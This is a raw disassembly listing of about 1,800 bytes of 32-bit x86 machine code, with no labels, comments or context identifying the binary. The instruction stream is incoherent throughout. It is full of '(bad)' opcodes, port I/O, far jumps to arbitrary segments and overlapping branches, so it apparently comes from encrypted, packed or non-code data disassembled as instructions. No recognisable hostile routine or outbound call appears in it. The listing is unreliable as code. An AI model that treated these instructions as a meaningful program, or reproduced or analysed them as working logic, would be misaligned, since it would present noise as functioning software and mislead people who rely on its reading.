  40ad9a:	lock out dx,eax
  40ad9c:	adc    BYTE PTR [ebx-0x69],bl
  40ad9f:	push   ss
  40ada0:	xchg   esp,eax
  40ada1:	icebp  
  40ada2:	repz push edx
  40ada4:	jmp    0xd9f8:0xbc66657a
  40adab:	mov    edx,0x3baad6fb
  40adb0:	or     DWORD PTR [eax],0x50
  40adb3:	repnz or eax,0x6f2f8dd1
  40adb9:	xchg   ebp,eax
  40adba:	les    ebx,FWORD PTR [edx]
  40adbc:	imul   DWORD PTR [eax]
  40adbe:	imul   edi,DWORD PTR [esi],0x56fd886a
  40adc4:	inc    edi
  40adc5:	es pop ebx
  40adc7:	xor    eax,0xaa74ad92
  40adcc:	push   es
  40adcd:	xchg   edi,eax
  40adce:	rol    BYTE PTR [esi-0x37ddec47],1
  40add4:	ja     0x40adab
  40add6:	jb     0x40ad83
  40add8:	pop    ecx
  40add9:	pop    ecx
  40adda:	clc    
  40addb:	jle    0x40ad5d
  40addd:	lds    edx,FWORD PTR [ebp-0x26]
  40ade0:	push   ds
  40ade1:	scas   eax,DWORD PTR es:[edi]
  40ade2:	mov    dl,0x7a
  40ade4:	or     eax,DWORD PTR [ecx]
  40ade6:	mov    DWORD PTR [ebx+0x56baf624],ebx
  40adec:	stos   BYTE PTR es:[edi],al
  40aded:	sbb    al,0x1c
  40adef:	repz mov al,0x1c
  40adf2:	enter  0x59f7,0x57
  40adf6:	sbb    BYTE PTR [edx-0x60],bl
  40adf9:	loope  0x40adf7
  40adfb:	xchg   edi,eax
  40adfc:	cmp    BYTE PTR [edi+0x24213b86],ah
  40ae02:	(bad)  
  40ae03:	imul   ebx,DWORD PTR [edx-0x78085d10],0xfffffff5
  40ae0a:	xchg   ebx,eax
  40ae0b:	jns    0x40ae6e
  40ae0d:	das    
  40ae0e:	jge    0x40adeb
  40ae10:	popf   
  40ae11:	xor    esp,DWORD PTR [ebx-0x704392ee]
  40ae17:	xchg   DWORD PTR [ecx-0x59],esi
  40ae1a:	enter  0x4d8a,0x43
  40ae1e:	out    dx,eax
  40ae1f:	(bad)  
  40ae20:	sbb    DWORD PTR [ecx],eax
  40ae22:	retf   0xfd9
  40ae25:	jp     0x40ae5e
  40ae27:	mov    edi,0x7140f6a3
  40ae2c:	gs clc 
  40ae2e:	(bad)  
  40ae30:	popa   
  40ae31:	push   ecx
  40ae32:	xor    al,0x8a
  40ae34:	adc    al,0x66
  40ae36:	mov    esi,0x30d48895
  40ae3b:	add    BYTE PTR [eax-0x5767a251],bh
  40ae41:	ins    BYTE PTR es:[edi],dx
  40ae42:	adc    eax,0x334f429d
  40ae47:	cmp    DWORD PTR [ebx+eax*8-0x25],edi
  40ae4b:	pop    ecx
  40ae4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae4d:	jo     0x40ae80
  40ae4f:	xor    ecx,edi
  40ae51:	fidiv  WORD PTR [edx-0x943e6a6]
  40ae57:	dec    ecx
  40ae58:	iret   
  40ae59:	lea    ebp,[ecx]
  40ae5b:	dec    esi
  40ae5c:	mov    ah,0x31
  40ae5e:	fbstp  TBYTE PTR [edx+0x52da36dd]
  40ae64:	pusha  
  40ae65:	sub    ebp,DWORD PTR [ecx-0x7d]
  40ae68:	fistp  DWORD PTR [ebx]
  40ae6a:	fsubr  DWORD PTR [ebx+esi*1+0x75]
  40ae6e:	xchg   esi,eax
  40ae6f:	dec    esi
  40ae70:	fistp  QWORD PTR [esi]
  40ae72:	loope  0x40aea0
  40ae74:	inc    edx
  40ae75:	xor    al,0xd2
  40ae77:	shr    DWORD PTR [edx+0x29],1
  40ae7a:	fcom   DWORD PTR [eax-0x5e]
  40ae7d:	cmp    ebp,eax
  40ae7f:	mov    BYTE PTR [edi-0x2f],ah
  40ae82:	out    0x30,eax
  40ae84:	lds    ebx,FWORD PTR [edi]
  40ae86:	and    ah,dl
  40ae88:	cdq    
  40ae89:	das    
  40ae8a:	sub    edi,DWORD PTR [ebp-0x14]
  40ae8d:	jmp    0x1311:0xbf2fdfad
  40ae94:	xchg   ebp,eax
  40ae95:	xchg   edi,eax
  40ae96:	pop    esp
  40ae97:	lods   al,BYTE PTR ds:[esi]
  40ae98:	retf   
  40ae99:	lea    eax,[edx+0x26]
  40ae9c:	lea    ebx,[ecx]
  40ae9e:	add    eax,0x64d4b7f5
  40aea3:	dec    eax
  40aea4:	jle    0x40ae88
  40aea6:	test   eax,0xd2f2568c
  40aeab:	adc    eax,0xef554c83
  40aeb0:	ja     0x40ae85
  40aeb2:	in     al,0xb9
  40aeb4:	das    
  40aeb5:	mov    eax,ds:0xa0d5c99c
  40aeba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aebb:	rcl    eax,0xcd
  40aebe:	scas   eax,DWORD PTR es:[edi]
  40aebf:	pop    edx
  40aec0:	ret    0xf60c
  40aec3:	jl     0x40aebc
  40aec5:	aaa    
  40aec6:	and    DWORD PTR [eax+0x27949498],ebp
  40aecc:	aad    0x79
  40aece:	mov    bl,0xb2
  40aed0:	mov    al,ds:0x788c9297
  40aed5:	fwait
  40aed6:	push   cs
  40aed7:	sbb    DWORD PTR [edi-0x1ba2c543],ecx
  40aedd:	jg     0x40ae64
  40aedf:	add    al,0x95
  40aee1:	stc    
  40aee2:	jle    0x40af23
  40aee4:	fwait
  40aee5:	pop    edx
  40aee6:	adc    BYTE PTR [ebx],al
  40aee8:	in     al,dx
  40aee9:	mov    edx,0x4f873f26
  40aeee:	push   0x56a914ad
  40aef3:	outs   dx,DWORD PTR ds:[esi]
  40aef4:	jb     0x40aee3
  40aef6:	je     0x40af3d
  40aef8:	fwait
  40aef9:	jecxz  0x40af30
  40aefb:	push   eax
  40aefc:	xchg   ecx,eax
  40aefd:	push   0x3c
  40aeff:	(bad)  
  40af00:	fiadd  DWORD PTR [edi]
  40af02:	push   edx
  40af03:	fimul  DWORD PTR [ebp-0x6c]
  40af06:	mov    cl,0xed
  40af08:	data16 sub al,0x6b
  40af0b:	(bad)  
  40af0c:	pop    esi
  40af0d:	or     edi,DWORD PTR [edi]
  40af0f:	push   ebp
  40af10:	and    al,0x7a
  40af12:	inc    ebx
  40af13:	lea    eax,[ebx]
  40af15:	dec    esi
  40af16:	xor    BYTE PTR [ecx-0x6a53d3a9],bl
  40af1c:	aad    0x2f
  40af1e:	pop    ebp
  40af1f:	fwait
  40af20:	push   ebx
  40af21:	inc    ebp
  40af22:	or     bh,ch
  40af24:	mov    ah,0x6a
  40af26:	inc    edi
  40af27:	iret   
  40af28:	pop    ecx
  40af29:	cmp    BYTE PTR [esi+0x77],dh
  40af2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af2d:	and    dl,BYTE PTR [ecx-0x1a]
  40af30:	add    eax,0xd1fddab2
  40af35:	in     eax,0xb9
  40af37:	shr    eax,cl
  40af39:	pop    ecx
  40af3a:	fcom   DWORD PTR [edx+0x17]
  40af3d:	jp     0x40af34
  40af3f:	mov    BYTE PTR [esi+esi*8],dh
  40af42:	scas   eax,DWORD PTR es:[edi]
  40af43:	xchg   ebx,eax
  40af44:	inc    ebx
  40af45:	jle    0x40afba
  40af47:	inc    edi
  40af48:	push   eax
  40af49:	dec    esp
  40af4a:	xchg   ebp,eax
  40af4b:	pop    ebx
  40af4c:	mov    ch,0x7b
  40af4e:	xchg   esp,eax
  40af4f:	pop    ebx
  40af50:	cmp    al,0x34
  40af52:	cdq    
  40af53:	jne    0x40aeec
  40af55:	int    0x7b
  40af57:	loop   0x40af28
  40af59:	cdq    
  40af5a:	mov    edi,esi
  40af5c:	stos   DWORD PTR es:[edi],eax
  40af5d:	les    esp,FWORD PTR [ecx]
  40af5f:	mov    dh,0xb5
  40af61:	mov    ch,0x8b
  40af63:	inc    edx
  40af64:	xor    al,0xe9
  40af66:	jle    0x40af79
  40af68:	mov    dh,0x6c
  40af6a:	mov    esp,eax
  40af6c:	jno    0x40af08
  40af6e:	and    esp,DWORD PTR [edi]
  40af70:	push   0xffffffd7
  40af72:	xor    al,0x1b
  40af74:	cmc    
  40af75:	push   es
  40af76:	adc    al,0x29
  40af78:	or     BYTE PTR [ebx-0x7f5a8d9e],bh
  40af7e:	icebp  
  40af7f:	jo     0x40afef
  40af81:	test   BYTE PTR [ebp+0x6],bl
  40af84:	or     eax,0xbc91a34
  40af89:	fdiv   DWORD PTR [ebx-0x500feb9f]
  40af8f:	(bad)  
  40af90:	jbe    0x40afc2
  40af92:	jne    0x40af78
  40af94:	or     DWORD PTR [ebp+eiz*1-0x49],ebp
  40af98:	out    dx,eax
  40af99:	mov    esi,0x3fb5112c
  40af9e:	sahf   
  40af9f:	fdiv   DWORD PTR [edx+0x12d6b84e]
  40afa5:	jne    0x40afff
  40afa7:	jae    0x40afd0
  40afa9:	mov    esi,0x1dc83b5e
  40afae:	nop
  40afaf:	rol    dl,0x8f
  40afb2:	pop    esp
  40afb3:	fisub  DWORD PTR [ecx+0x38]
  40afb6:	dec    edx
  40afb7:	dec    ecx
  40afb8:	(bad)  [ebx-0x76e379f6]
  40afbe:	and    ebx,0xa10effd9
  40afc4:	and    eax,0xa25861be
  40afc9:	fmul   st(0),st
  40afcb:	pop    edi
  40afcc:	pop    es
  40afcd:	or     BYTE PTR [ebp-0x3577cab8],dh
  40afd3:	ret    0xa3
  40afd6:	sub    BYTE PTR [edi-0x3d1c826f],cl
  40afdc:	cld    
  40afdd:	xlat   BYTE PTR ds:[ebx]
  40afde:	cwde   
  40afdf:	mov    ebx,0xa82b9d3b
  40afe4:	pop    edi
  40afe5:	or     eax,0x332a9416
  40afea:	icebp  
  40afeb:	out    0xab,eax
  40afed:	lods   al,BYTE PTR ds:[esi]
  40afee:	out    0xaa,eax
  40aff0:	daa    
  40aff1:	scas   eax,DWORD PTR es:[edi]
  40aff2:	and    ebp,DWORD PTR [ebx+0x2c]
  40aff5:	xchg   edi,eax
  40aff6:	xchg   esi,eax
  40aff7:	adc    cl,al
  40aff9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40affa:	in     al,dx
  40affb:	mov    edx,0x45d24a7c
  40b000:	or     DWORD PTR ds:0xca0e2726,edx
  40b006:	pop    eax
  40b007:	test   BYTE PTR [edx+0x50df409b],0x80
  40b00e:	retf   0xcbd8
  40b011:	scas   eax,DWORD PTR es:[edi]
  40b012:	lea    ebp,[ecx]
  40b014:	ins    DWORD PTR es:[edi],dx
  40b015:	jne    0x40afee
  40b017:	add    BYTE PTR [eax-0x5042276],bh
  40b01d:	sub    esp,DWORD PTR [ebp+0x6d]
  40b020:	push   edi
  40b021:	mov    eax,0x57d95803
  40b026:	addr16 das 
  40b028:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b029:	arpl   WORD PTR [edx],di
  40b02b:	ret    
  40b02c:	push   cs
  40b02d:	mov    ds:0xf10ddeb6,al
  40b032:	sub    eax,0x1bfe4810
  40b037:	hlt    
  40b038:	add    ecx,ebp
  40b03a:	dec    ebp
  40b03b:	add    edi,esp
  40b03d:	mov    ds:0xfc284cfb,al
  40b042:	inc    esp
  40b043:	xchg   ebx,eax
  40b044:	sub    cl,bl
  40b046:	and    eax,0x30683bd7
  40b04b:	pop    ds
  40b04c:	fld    QWORD PTR [edx+edx*2-0x37]
  40b050:	jecxz  0x40b024
  40b052:	adc    BYTE PTR [esi-0x61aabe8],cl
  40b058:	mov    ecx,0x2e24cc58
  40b05d:	jns    0x40b05d
  40b05f:	jmp    0x1031432f
  40b064:	push   ebx
  40b065:	sub    cl,ch
  40b067:	fcomi  st,st(5)
  40b069:	pop    ebp
  40b06a:	dec    esi
  40b06b:	inc    esi
  40b06c:	jmp    0x4931c493
  40b071:	cld    
  40b072:	retf   0x35f8
  40b075:	outs   dx,DWORD PTR ds:[esi]
  40b076:	xchg   DWORD PTR [esi],ecx
  40b078:	mov    ebp,DWORD PTR [edx-0x4a]
  40b07b:	mov    ebp,0x5bef95c2
  40b080:	jno    0x40b03b
  40b082:	mov    ds:0x1aa64352,al
  40b087:	cmp    eax,0x676ae1d3
  40b08c:	(bad)  
  40b08d:	inc    edx
  40b08e:	mov    BYTE PTR [ebx-0x2b],cl
  40b091:	jmp    0xa5ac5967
  40b096:	sahf   
  40b097:	sbb    edi,ebx
  40b099:	and    ecx,ebx
  40b09b:	lea    eax,[ebp+esi*1+0x15]
  40b09f:	inc    ebx
  40b0a0:	push   edi
  40b0a1:	adc    eax,esp
  40b0a3:	(bad)  
  40b0a4:	cli    
  40b0a5:	das    
  40b0a6:	dec    ecx
  40b0a7:	lahf   
  40b0a8:	outs   dx,BYTE PTR ds:[esi]
  40b0a9:	(bad)  
  40b0aa:	push   eax
  40b0ab:	lock retf 
  40b0ad:	mov    BYTE PTR [edx],bl
  40b0af:	xor    esp,DWORD PTR [eax]
  40b0b1:	lahf   
  40b0b2:	cmp    BYTE PTR [ecx+0x4a19d269],dh
  40b0b8:	xor    al,0xc5
  40b0bb:	ins    BYTE PTR es:[edi],dx
  40b0bc:	lds    edx,FWORD PTR [eax]
  40b0be:	cmc    
  40b0bf:	movnti DWORD PTR [esi+0x30],ebp
  40b0c3:	aad    0xce
  40b0c5:	jae    0x40b085
  40b0c7:	mov    esi,0x4d7b15dd
  40b0cc:	adc    edx,DWORD PTR [eax]
  40b0ce:	cmp    edi,ebp
  40b0d0:	or     cl,BYTE PTR [ebp-0x6]
  40b0d3:	pusha  
  40b0d4:	push   ebx
  40b0d5:	popa   
  40b0d6:	jb     0x40b115
  40b0d8:	mov    dh,0xb6
  40b0da:	test   eax,0x62bdbde4
  40b0df:	mov    es,eax
  40b0e1:	mov    edi,cs
  40b0e3:	mov    ebx,0xd990fa58
  40b0e8:	call   0xf40c:0x39a68c52
  40b0ef:	jno    0x40b0dc
  40b0f1:	mov    al,ds:0xea3055a3
  40b0f6:	outs   dx,DWORD PTR ds:[esi]
  40b0f7:	cmp    DWORD PTR [eax+ecx*1+0x1e],ebp
  40b0fb:	cld    
  40b0fc:	adc    BYTE PTR ds:[esi+0x5c],dl
  40b100:	xor    BYTE PTR [eax+esi*2-0x36],ch
  40b104:	lahf   
  40b105:	push   ds
  40b106:	pushf  
  40b107:	dec    edx
  40b108:	scas   al,BYTE PTR es:[edi]
  40b109:	ins    BYTE PTR es:[edi],dx
  40b10a:	sbb    al,bh
  40b10c:	hlt    
  40b10d:	(bad)  
  40b10e:	mov    ch,BYTE PTR [ecx+0x67]
  40b111:	xchg   ebp,eax
  40b112:	pop    ecx
  40b113:	mov    bl,0x83
  40b115:	addr16 js 0x40b0e5
  40b118:	jle    0x40b132
  40b11a:	in     eax,dx
  40b11b:	add    esp,eax
  40b11d:	test   DWORD PTR [esi+0x11035df3],ebp
  40b123:	test   eax,ebx
  40b125:	sti    
  40b126:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b127:	mov    dl,0x2b
  40b129:	jecxz  0x40b0fa
  40b12b:	cmp    DWORD PTR [eax],eax
  40b12d:	xchg   ebp,eax
  40b12e:	mov    BYTE PTR [ebp-0x3c],dl
  40b131:	sub    al,0xb3
  40b133:	icebp  
  40b134:	fcomip st,st(0)
  40b136:	mov    ah,0xcd
  40b138:	in     al,0xf3
  40b13a:	jnp    0x40b15d
  40b13c:	ins    DWORD PTR es:[edi],dx
  40b13d:	xor    eax,DWORD PTR [edx-0x49d4e42c]
  40b143:	fmul   QWORD PTR [ecx+0x5d]
  40b146:	sbb    BYTE PTR [eax-0x7d82d91c],ch
  40b14c:	fimul  DWORD PTR [eax-0x65]
  40b14f:	mov    gs,WORD PTR [esi-0x615f52f3]
  40b155:	test   ebp,eax
  40b157:	mov    edi,0x3a2a0203
  40b15c:	mov    edx,0x72448ff2
  40b161:	push   eax
  40b162:	inc    edx
  40b163:	sbb    eax,0xa4a8049d
  40b168:	pop    edi
  40b169:	pop    ds
  40b16a:	leave  
  40b16b:	jle    0x40b19c
  40b16d:	dec    ebp
  40b16e:	push   0x78
  40b170:	ds loop 0x40b1c5
  40b173:	mov    BYTE PTR [ecx-0x79a5591],dl
  40b179:	sub    DWORD PTR [edx],0xfffffff8
  40b17c:	mov    ah,0x90
  40b17e:	imul   ecx,edi,0xffffff96
  40b181:	dec    esp
  40b182:	clc    
  40b183:	xor    al,0x65
  40b185:	dec    eax
  40b186:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b187:	es in  al,0xf4
  40b18a:	pop    ecx
  40b18b:	sub    al,BYTE PTR [ebx]
  40b18d:	xchg   ebx,eax
  40b18e:	dec    eax
  40b18f:	inc    eax
  40b190:	add    al,BYTE PTR [ebx+0x4ebd9639]
  40b196:	repz mov esi,0x40b91c97
  40b19c:	jns    0x40b166
  40b19e:	sahf   
  40b19f:	out    dx,al
  40b1a0:	dec    eax
  40b1a1:	iret   
  40b1a2:	pushf  
  40b1a3:	rol    DWORD PTR [edx+0x4f],0xe9
  40b1a7:	js     0x40b12e
  40b1a9:	mov    BYTE PTR [esi],bh
  40b1ab:	adc    al,0x97
  40b1ad:	(bad)  
  40b1ae:	mov    ecx,0x4e3d0db0
  40b1b3:	outs   dx,BYTE PTR ds:[esi]
  40b1b4:	xchg   BYTE PTR [ecx+eiz*4-0x60],dl
  40b1b8:	jae    0x40b193
  40b1ba:	pop    edi
  40b1bb:	fsubr  st(3),st
  40b1bd:	or     al,0xde
  40b1bf:	pop    edx
  40b1c0:	fldenv [edx+0xc]
  40b1c3:	mov    ebp,0xef2bf875
  40b1c8:	xor    BYTE PTR [ebx-0x69fd7325],cl
  40b1ce:	xor    BYTE PTR [edi+0xc],0xef
  40b1d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1d3:	inc    edx
  40b1d4:	pop    ss
  40b1d5:	adc    BYTE PTR [edi-0x64],bh
  40b1d8:	inc    ebx
  40b1d9:	push   edi
  40b1da:	mov    ebp,0xefa73fa5
  40b1df:	dec    ecx
  40b1e0:	and    al,al
  40b1e2:	data16 sbb al,0x35
  40b1e5:	jle    0x40b1f5
  40b1e7:	outs   dx,DWORD PTR ds:[esi]
  40b1e8:	repnz xchg edi,eax
  40b1ea:	ss cwde 
  40b1ec:	mov    cl,0xbe
  40b1ee:	fistp  QWORD PTR [ebp-0x488568a0]
  40b1f4:	sub    dl,BYTE PTR ds:0xca664a97
  40b1fa:	data16 and al,0xe3
  40b1fd:	pop    ds
  40b1fe:	mov    eax,DWORD PTR [ebp-0x188afacb]
  40b204:	out    0x3f,al
  40b206:	pop    eax
  40b207:	mov    eax,0x43ded4f1
  40b20c:	fcom   QWORD PTR [edx-0x6f]
  40b20f:	pop    ss
  40b210:	push   esi
  40b211:	mov    ds:0xa8a62602,eax
  40b216:	add    DWORD PTR [edi-0x28],0x28e379dd
  40b21d:	xor    al,0x75
  40b21f:	sub    BYTE PTR [eax-0x3a2ed9ed],al
  40b225:	add    eax,0x56f6e047
  40b22a:	jp     0x40b29a
  40b22c:	fmul   QWORD PTR [ecx]
  40b22e:	xchg   esp,eax
  40b22f:	icebp  
  40b230:	inc    edi
  40b231:	call   FWORD PTR [ebp+ebx*1+0x29]
  40b235:	or     DWORD PTR [ecx+0x4f],ecx
  40b238:	push   edx
  40b239:	mov    esi,0x14cbefa4
  40b23e:	mov    esi,0xc80468b7
  40b243:	inc    eax
  40b244:	dec    ebx
  40b245:	addr16 inc eax
  40b247:	das    
  40b248:	cdq    
  40b249:	retf   0x79f7
  40b24c:	shl    BYTE PTR [ebx],1
  40b24e:	aam    0xef
  40b250:	in     al,dx
  40b251:	outs   dx,BYTE PTR ds:[esi]
  40b252:	bound  esp,QWORD PTR [edi]
  40b254:	push   esi
  40b255:	aad    0xde
  40b257:	jge    0x40b2c1
  40b259:	xor    eax,0x93283ad2
  40b25e:	xchg   bl,dh
  40b260:	ins    DWORD PTR es:[edi],dx
  40b261:	mov    ebp,ebp
  40b263:	stos   BYTE PTR es:[edi],al
  40b264:	mov    dl,BYTE PTR [ecx]
  40b266:	pushf  
  40b267:	xor    BYTE PTR [edi-0x1c],0x1
  40b26b:	call   0xc5e6:0x9ab649eb
  40b272:	jmp    0x71ab42b9
  40b277:	sti    
  40b278:	sbb    esp,DWORD PTR [eax]
  40b27a:	pop    es
  40b27b:	ror    al,1
  40b27d:	inc    ebp
  40b27e:	push   ebp
  40b27f:	jge    0x40b211
  40b281:	inc    eax
  40b282:	sahf   
  40b283:	mov    WORD PTR [eax+0x696932c8],ds
  40b289:	mov    al,0x76
  40b28b:	fwait
  40b28c:	sub    DWORD PTR [eax-0xfaa892],edi
  40b292:	add    esi,DWORD PTR [ecx]
  40b294:	das    
  40b295:	pop    esi
  40b296:	das    
  40b297:	jae    0x40b2f4
  40b299:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b29a:	ret    
  40b29b:	call   0xa54d:0x52fd2d6f
  40b2a2:	in     al,dx
  40b2a3:	jle    0x40b309
  40b2a5:	in     eax,0xcc
  40b2a7:	add    ch,BYTE PTR [edx-0x32]
  40b2aa:	jo     0x40b23f
  40b2ac:	xchg   DWORD PTR [edx-0x74],ebx
  40b2af:	clc    
  40b2b0:	mov    ds:0x5612d174,eax
  40b2b5:	mov    ch,0xcd
  40b2b7:	jmp    0xeb75:0x5cfe06d9
  40b2be:	cmp    al,0xb2
  40b2c0:	xor    eax,0x66efca9a
  40b2c5:	call   0x1148f0a8
  40b2ca:	xchg   esi,eax
  40b2cb:	mov    cl,0xa1
  40b2cd:	cdq    
  40b2ce:	xchg   BYTE PTR [eax-0x2e],ch
  40b2d1:	les    edx,FWORD PTR [edi-0xb4b010a]
  40b2d7:	in     al,dx
  40b2d8:	sub    DWORD PTR [edx+0x62],0xfa7c5e32
  40b2df:	aas    
  40b2e0:	lods   al,BYTE PTR ds:[esi]
  40b2e1:	outs   dx,BYTE PTR ds:[esi]
  40b2e2:	lock les esp,FWORD PTR [edx+eax*8]
  40b2e6:	pop    ebp
  40b2e7:	jge    0x40b2ad
  40b2e9:	pop    es
  40b2ea:	fsub   QWORD PTR [eax-0x97e70c1]
  40b2f0:	dec    ebx
  40b2f1:	ficom  DWORD PTR [esp+ecx*2-0x71]
  40b2f5:	pop    ebx
  40b2f6:	fwait
  40b2f7:	xor    ah,BYTE PTR [ebx+0x398c75a3]
  40b2fd:	jns    0x40b334
  40b2ff:	lods   al,BYTE PTR ds:[esi]
  40b300:	mov    edi,0xbad2dc17
  40b305:	xchg   ebx,eax
  40b306:	test   BYTE PTR [ebp-0x44],0xbb
  40b30a:	cmp    al,0xbf
  40b30c:	aam    0x3b
  40b30e:	xchg   ebp,eax
  40b30f:	ins    BYTE PTR es:[edi],dx
  40b310:	fbld   TBYTE PTR [esp+edi*4+0x7d]
  40b314:	push   edx
  40b315:	sar    DWORD PTR [edx+eiz*1+0x3b],0xd9
  40b31a:	cmc    
  40b31b:	inc    esp
  40b31c:	push   ebp
  40b31d:	pusha  
  40b31e:	scas   al,BYTE PTR es:[edi]
  40b31f:	push   eax
  40b320:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b321:	jmp    0x4be4:0x98e6605
  40b328:	mov    al,0x1
  40b32a:	jbe    0x40b392
  40b32c:	mov    dh,0x51
  40b32e:	lods   al,BYTE PTR ds:[esi]
  40b32f:	lea    ebp,[esi+0x36692c53]
  40b335:	sub    al,0x1d
  40b337:	ins    DWORD PTR es:[edi],dx
  40b338:	(bad)  
  40b339:	rol    BYTE PTR [edi],cl
  40b33b:	enter  0x7217,0x7c
  40b33f:	mov    ds:0x5aff0d99,al
  40b344:	jmp    0xa065:0x5f407829
  40b34b:	sub    esp,ecx
  40b34d:	gs jbe 0x40b345
  40b350:	jmp    0x40b372
  40b352:	mov    eax,0x8ba56bd6
  40b357:	push   cs
  40b358:	jl     0x40b31d
  40b35a:	pop    ds
  40b35b:	pop    ebx
  40b35c:	inc    esi
  40b35d:	push   edi
  40b35e:	xchg   ecx,eax
  40b35f:	mov    DWORD PTR [ebx],eax
  40b361:	adc    BYTE PTR [esi+0x11],ch
  40b364:	jbe    0x40b3df
  40b366:	jle    0x40b345
  40b368:	or     BYTE PTR [esi+0x42a573b9],0x2a
  40b36f:	or     edi,DWORD PTR [ecx+0x6f]
  40b372:	add    eax,0x80b3741d
  40b377:	ret    0x545e
  40b37a:	cmp    eax,DWORD PTR [ebp+0x1549f012]
  40b380:	aaa    
  40b381:	mov    al,0xdc
  40b383:	push   esp
  40b384:	push   cs
  40b385:	and    ch,bh
  40b387:	pusha  
  40b388:	sbb    dl,BYTE PTR ss:[esi-0x27b559aa]
  40b38f:	add    ebx,ebx
  40b391:	out    0x6e,al
  40b393:	ret    
  40b394:	enter  0x9e29,0x64
  40b398:	idiv   bl
  40b39a:	pop    edx
  40b39b:	repnz test DWORD PTR [esp+eax*2-0x56],ebp
  40b3a0:	xchg   esi,eax
  40b3a1:	out    0xe3,al
  40b3a3:	ja     0x40b3f0
  40b3a5:	xor    ebx,DWORD PTR [edi]
  40b3a7:	adc    eax,0x8ed3532f
  40b3ac:	push   es
  40b3ad:	out    dx,eax
  40b3ae:	xor    edi,eax
  40b3b0:	and    DWORD PTR [eax+0x68],edi
  40b3b3:	push   esi
  40b3b4:	and    BYTE PTR [ecx-0x14],0x13
  40b3b8:	in     al,0xa
  40b3ba:	sub    ebp,DWORD PTR [esi]
  40b3bc:	outs   dx,BYTE PTR ds:[esi]
  40b3bd:	ret    
  40b3be:	mov    edx,0x1005a187
  40b3c3:	dec    ecx
  40b3c4:	mov    ah,0xdc
  40b3c6:	cmp    cl,bh
  40b3c8:	imul   ebx,DWORD PTR [esi],0x19de4f38
  40b3ce:	push   ds
  40b3cf:	pop    ebx
  40b3d0:	ret    0xc5ca
  40b3d3:	rol    DWORD PTR [edx+0x3f],0x16
  40b3d7:	or     BYTE PTR [ebx-0x18],dh
  40b3da:	cdq    
  40b3db:	dec    edx
  40b3dc:	adc    BYTE PTR [edi-0x46],dh
  40b3df:	cs push es
  40b3e1:	sub    DWORD PTR [edi+ebx*1+0x7a],esp
  40b3e5:	sbb    ecx,DWORD PTR [ecx-0x7a2c2ca8]
  40b3eb:	jae    0x40b46b
  40b3ed:	sub    BYTE PTR [ebx],0x1f
  40b3f0:	sbb    ah,bl
  40b3f2:	loope  0x40b3e0
  40b3f4:	dec    edx
  40b3f5:	ins    BYTE PTR es:[edi],dx
  40b3f6:	(bad)  
  40b3f7:	mov    edi,0xd30e7771
  40b3fc:	retf   
  40b3fd:	jo     0x40b467
  40b3ff:	cs dec ebx
  40b401:	xlat   BYTE PTR ds:[ebx]
  40b402:	stc    
  40b403:	shr    dh,1
  40b405:	xchg   eax,esi
  40b407:	lods   eax,DWORD PTR ds:[esi]
  40b408:	aam    0x1b
  40b40a:	dec    esi
  40b40b:	(bad)  
  40b40c:	sbb    al,0xcd
  40b40e:	mov    dl,0x93
  40b410:	ins    DWORD PTR es:[edi],dx
  40b411:	rcr    DWORD PTR [ecx+ebx*4+0x6e64ea65],1
  40b418:	or     BYTE PTR [ebx],ah
  40b41a:	data16 jp 0x40b499
  40b41d:	xor    DWORD PTR [eax],esp
  40b41f:	jne    0x40b3b0
  40b421:	and    eax,0xc6a8dce0
  40b426:	retf   0x3f4a
  40b429:	rcl    DWORD PTR [ebx],0xea
  40b42c:	xlat   BYTE PTR ds:[ebx]
  40b42d:	ss sub al,0x71
  40b430:	dec    esp
  40b431:	mov    esi,0xc7f6de3c
  40b436:	pop    ds
  40b437:	sub    eax,0xea8df3
  40b43c:	ror    BYTE PTR [edx-0x2a039ec0],cl
  40b442:	(bad)  
  40b443:	stc    
  40b444:	xor    eax,0xa0d6128e
  40b449:	stos   BYTE PTR es:[edi],al
  40b44a:	pop    ds
  40b44b:	mov    dh,0x40
  40b44d:	test   al,0x5d
  40b44f:	dec    DWORD PTR [eax+0x3d]
  40b452:	pop    ebx
  40b453:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b454:	nop    DWORD PTR [ebp+0x6c5f6fdc]
  40b45b:	or     al,0x96
  40b45d:	jp     0x40b437
  40b45f:	pop    es
  40b460:	push   ecx
  40b461:	aas    
  40b462:	call   0xeb82:0x32ad93c8
  40b469:	cmc    
  40b46a:	js     0x40b4b2
  40b46c:	imul   ecx,DWORD PTR [eax+0x33],0xf88622c2
  40b473:	cmp    ecx,DWORD PTR [esi+0x7dffa3e1]
  40b479:	lods   eax,DWORD PTR ds:[esi]
  40b47a:	fidivr WORD PTR [edi-0x65]
  40b47d:	pop    eax
  40b47e:	mov    bh,0x24
  40b480:	aad    0xf1
  40b482:	sub    DWORD PTR [ecx-0x9],0x33
  40b486:	sbb    eax,0xc1123698
  40b48b:	jge    0x40b459
  40b48d:	fwait
  40b48e:	inc    eax
  40b48f:	rol    BYTE PTR [ebx-0x7a],0x19
  40b493:	jno    0x40b438
  40b495:	jns    0x40b452
  40b497:	push   esi
  40b498:	rcr    BYTE PTR [edx],0x82
  40b49b:	jo     0x40b4e6
  40b49d:	jnp    0x40b435
  40b49f:	add    eax,0x10f94191
  40b4a4:	das    
  40b4a5:	jle    0x40b46d
  40b4a7:	in     al,0x60
  40b4a9:	fwait
  40b4aa:	stc    
  40b4ab:	int3   
  40b4ac:	jge    0x40b4f5
  40b4ae:	jno    0x40b4b5
  40b4b0:	leave  
  40b4b1:	cmp    BYTE PTR [ecx-0x56],ah
  40b4b4:	ss shl dh,0xdb
  40b4b8:	retf   
  40b4b9:	int    0x6f
  40b4bb:	mov    eax,ds:0x3db8d192
  40b4c0:	cwde   
  40b4c1:	sub    eax,0x2c20a639
  40b4c6:	push   ss
  40b4c7:	pusha  
  40b4c8:	sbb    bh,BYTE PTR [edx]
  40b4ca:	jmp    0x3da34d89
  40b4cf:	imul   DWORD PTR [edi+0x5]
